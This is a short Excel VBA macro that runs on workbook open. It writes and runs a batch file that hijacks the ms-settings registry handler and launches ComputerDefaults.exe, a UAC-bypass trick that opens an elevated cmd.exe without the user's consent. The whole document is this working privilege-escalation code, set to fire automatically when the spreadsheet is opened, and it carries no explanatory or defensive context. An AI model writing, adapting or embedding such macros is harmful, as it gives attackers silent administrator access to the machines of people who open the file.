Private Sub Workbook_Open()
   Const TemporaryFolder = 2

Dim fso: Set fso = createobject("Scripting.FileSystemObject")

Dim tempFolder: tempFolder = fso.GetSpecialFolder(TemporaryFolder)

Set b = createobject("wscript.shell")
Set objfso = createobject("scripting.filesystemobject")
Set ar = objfso.createtextfile(tempFolder & "archivo.bat", True)

ar.writeline " reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f  "
ar.writeline " reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f  "
ar.writeline " powershell.exe Start-Sleep -Seconds 3 "
ar.writeline " powershell.exe Start-Process ""C:\Windows\System32\ComputerDefaults.exe""  "
ar.close
b.run tempFolder & "archivo.bat", 1, True
End Sub